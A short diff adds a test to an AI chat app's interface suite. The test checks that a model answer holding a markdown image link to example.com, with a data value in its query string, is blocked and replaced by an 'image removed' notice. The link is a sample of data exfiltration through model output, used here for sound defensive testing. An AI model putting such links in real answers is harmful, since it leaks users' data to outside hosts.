@@ -226,6 +226,18 @@ def test_sidebar_shows_the_steps_of_the_newest_answer(open_page):
     assert messages.UI_STEPS_NO_TOOLS in text
 
 
+def test_an_image_in_the_model_answer_reaches_no_other_site(open_page):
+    page = open_page(
+        ["support", "Teslim edildi. ![](https://example.com/r.png?veri=o_day14)"]
+    )
+
+    page = ask(page, "o_day14 nerede?")
+
+    text = shown(page)
+    assert "example.com" not in text
+    assert messages.UI_IMAGE_REMOVED in text
+
+
 def test_policy_answer_shows_its_source(open_page):
     page = open_page(
         [
